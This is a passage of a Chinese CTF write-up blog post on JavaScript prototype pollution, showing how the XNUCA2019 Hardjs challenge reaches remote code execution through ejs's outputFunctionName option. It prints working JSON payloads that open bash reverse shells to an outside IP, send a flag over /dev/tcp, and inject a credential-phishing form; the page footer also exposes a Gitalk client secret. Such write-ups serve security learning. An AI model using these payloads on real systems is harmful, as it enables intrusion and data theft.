class="keyword">var</span> escapeFn = opts.escapeFunction;</span><br><span class="line">    <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.source) &#123;</span><br><span class="line">      <span class="built_in">this</span>.generateSource();</span><br><span class="line">      prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">        prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.localsName + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="built_in">this</span>.source = prepended + <span class="built_in">this</span>.source + appended;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">      src = <span class="built_in">this</span>.source;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.async) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&#x27;return (async function()&#123;&#125;).constructor;&#x27;</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;This environment does not support async/await&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="built_in">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a callable function which will execute the function</span></span><br><span class="line">    <span class="comment">// created by the source-code, with the passed data as locals</span></span><br><span class="line">    <span class="comment">// Adds a local `include` function which allows full recursive include</span></span><br><span class="line">    <span class="keyword">var</span> returnedFn = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> include = <span class="function"><span class="keyword">function</span> (<span class="params">path, includeData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = utils.shallowCopy(&#123;&#125;, data);</span><br><span class="line">        <span class="keyword">if</span> (includeData) &#123;</span><br><span class="line">          d = utils.shallowCopy(d, includeData);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> includeFile(path, opts)(d);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> fn.apply(opts.context, [data || &#123;&#125;, escapeFn, include, rethrow]);</span><br><span class="line">    &#125;;</span><br><span class="line">    returnedFn.dependencies = <span class="built_in">this</span>.dependencies;</span><br><span class="line">    <span class="keyword">return</span> returnedFn;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
+
+<p>这段代码中</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>就是我们一直寻找的东西，这个对象会与其他生成的模板字符串一起拼接到<code>this.source</code>，然后传递给<code>src</code>，接着是<code>fn</code>，然后以<code>returnedFn</code>返回并最后被执行。而一路跟进的时候可以发现，并<strong>没有</strong><code>outputFunctionName</code>的身影，所以只要给Object的<code>prototype</code>加上这个成员(属性)，我们就可以实现从原型链污染到RCE的攻击过程了！</p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><h4 id="js原型链到RCE"><a href="#js原型链到RCE" class="headerlink" title="js原型链到RCE"></a>js原型链到RCE</h4><p>题目环境是可以访问<code>process</code> 的(可以用来进行反弹shell), 而这里的环境不行..</p>
+<p>payload: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;content&quot;: &#123;</span><br><span class="line">        &quot;constructor&quot;: &#123;</span><br><span class="line">            &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.0.14.127&#x2F;2333 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;type&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;: &quot;fuck&quot;, &quot;content&quot;: &#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;outputFunctionName&quot;: &quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;174.0.14.127&#x2F;2333 0&lt;&amp;1 2&gt;&amp;1\&quot;&#39;); &#x2F;&#x2F;&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;logger&quot;:&quot;&lt;form action&#x3D;&#39;http:&#x2F;&#x2F;174.0.14.127:2333&#39; method&#x3D;&#39;post&#39; class&#x3D;&#39;am-form&#39;&gt;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;username&#39; id&#x3D;&#39;email&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;password&#39; name&#x3D;&#39;password&#39; id&#x3D;&#39;password&#39; value&#x3D;&#39;&#39;&gt;&lt;input type&#x3D;&#39;submit&#39; name&#x3D;&#39;&#39; &gt;&lt;&#x2F;form&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他解法: </p>
+<h4 id="利用ejs-进行-rce"><a href="#利用ejs-进行-rce" class="headerlink" title="利用ejs 进行 rce"></a>利用ejs 进行 rce</h4><p>解法一: </p>
+<p>查看ejs的源码，看到下面代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (!this.source) &#123;</span><br><span class="line">  this.generateSource();</span><br><span class="line">  prepended +&#x3D; &#39;  var __output &#x3D; [], __append &#x3D; __output.push.bind(__output);&#39; + &#39;\n&#39;;</span><br><span class="line">  if (opts.outputFunctionName) &#123;</span><br><span class="line">    prepended +&#x3D; &#39;  var &#39; + opts.outputFunctionName + &#39; &#x3D; __append;&#39; + &#39;\n&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  if (opts._with !&#x3D;&#x3D; false) &#123;</span><br><span class="line">    prepended +&#x3D;  &#39;  with (&#39; + opts.localsName + &#39; || &#123;&#125;) &#123;&#39; + &#39;\n&#39;;</span><br><span class="line">    appended +&#x3D; &#39;  &#125;&#39; + &#39;\n&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">  appended +&#x3D; &#39;  return __output.join(&quot;&quot;);&#39; + &#39;\n&#39;;</span><br><span class="line">  this.source &#x3D; prepended + this.source + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在看后面是一个动态函数生成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    ctor &#x3D; Function;</span><br><span class="line">  &#125;</span><br><span class="line">  fn &#x3D; new ctor(opts.localsName + &#39;, escapeFn, include, rethrow&#39;, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以需要伪造 <code>outputFunctionName</code> 为一段恶意代码，就可以实现rce ，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:</span><br><span class="line">&#123;&quot;outputFunctionName&quot;:&quot;a&#x3D;1;process.mainModule.require(&#39;child_process&#39;).exec(&#39;b</span><br><span class="line">ash -c \&quot;echo $FLAG&gt;&#x2F;dev&#x2F;tcp&#x2F;xxxxx&#x2F;xx\&quot;&#39;)&#x2F;&#x2F;&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解法二的payload: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return</span><br><span class="line">process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>详细参考官方wp</p>
+<p>参考WP: </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113">https://xz.aliyun.com/t/6113</a></p>
+<p><a target="_blank" rel="noopener" href="https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/">https://lihuaiqiu.github.io/2019/09/25/XNUCA2019-Hardjs/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">https://www.bdwms.com/?p=525</a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/ifonlyddw/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">https://gitee.com/ifonlyddw/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a> (官方wp, 不过我clone到了码云,这样更快一点)</p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03    总结"></a>0x03    总结</h1><p><strong>不积跬步无以至千里</strong></p>
+<p>后面有时间可以多找点这种题刷一刷,,, 自己审一审,,, 花了一上午和一下午, 值了!!! 总算是对原型链污染有点印象了!</p>
+<p>继续努力</p>
+<p>关于这个漏洞, 有点和pop 链的构造相似, 可能因为都属于面向对象, 当然关于这一块的漏洞还有很多, 可以看这篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12659738.html">https://www.cnblogs.com/20175211lyz/p/12659738.html</a></p>
+<h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04    参考资料"></a>0x04    参考资料</h1><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Smi1e师傅的文章</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">P🐮的文章</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176884">https://www.anquanke.com/post/id/176884</a></p>
+<p><a target="_blank" rel="noopener" href="https://meizjm3i.github.io/2018/09/11/JavaScript_Prototype_Pollution/">https://meizjm3i.github.io/2018/09/11/JavaScript_Prototype_Pollution/</a> 由浅入深, 并讲解了例题</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/755/#hard-thejs">https://paper.seebug.org/755/#hard-thejs</a>  一篇writeup 可以看看思路….Orz</p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/better-programming/prototypes-in-javascript-5bba2990e04b">https://medium.com/better-programming/prototypes-in-javascript-5bba2990e04b</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/fe9/basic/zk5e4f">https://www.yuque.com/fe9/basic/zk5e4f</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">https://www.bdwms.com/?p=525</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bdwms.com/?p=525">深入理解prototype proto 和 constructor 的关系</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hack-for.fun">m0nk3y</a>
+            <p>原文链接：<a href="https://hack-for.fun/710f.html">https://hack-for.fun/710f.html</a>
+            <p>发表日期：<a href="https://hack-for.fun/710f.html">April 15th 2020, 8:56:06 am</a>
+            <p>更新日期：<a href="https://hack-for.fun/710f.html">August 25th 2020, 4:45:35 pm</a>
+            <p>版权声明：<b>原创文章转载时请注明出处</b></p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/b3d1.html" title= "Windows10 神舟U47T1 装Macos">
+                    <div class="nextTitle">Windows10 神舟U47T1 装Macos</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/a703.html" title= "内网渗透初级学习笔记(一)-渗透测试流程">
+                    <div class="prevTitle">内网渗透初级学习笔记(一)-渗透测试流程</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <div id="comment-container"></div>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.css">
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '6ceed9c245da8d33222a',
+            clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
+            id: '1586912166000',
+            repo: 'Gitalk',
+            owner: 'ifonly-go2019',
+            admin: "ifonly-go2019",
+            createIssueManually: true,
+            distractionFreeMode: false
+        })
+        gitalk.render('comment-container')
+    </script>
+    
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:ifonlysec@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/ifonly-go2019" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+    
+    <span id="busuanzi_container_site_uv">累计访客量: <span id="busuanzi_value_site_uv"></span> </span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x00    前置基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E7%BB%A7%E6%89%BF"><span class="toc-number">1.1.</span> <span class="toc-text">原型链与继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF"><span class="toc-number">1.2.</span> <span class="toc-text">基于原型链的继承</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.1.</span> <span class="toc-text">继承属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">继承方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E5%9E%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">使用原型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%94%9F%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.4.</span> <span class="toc-text">创建对象和生成原型链</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">0x01 原型链污染攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Hacking-in-CTF"><span class="toc-number">3.</span> <span class="toc-text">0x02    Hacking in CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XNUCA2019-Hardjs"><span class="toc-number">3.1.</span> <span class="toc-text">XNUCA2019 Hardjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.1.2.</span> <span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">3.1.3.</span> <span class="toc-text">漏洞验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%88%B0RCE"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">js原型链到RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ejs-%E8%BF%9B%E8%A1%8C-rce"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">利用ejs 进行 rce</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03    总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">0x04    参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
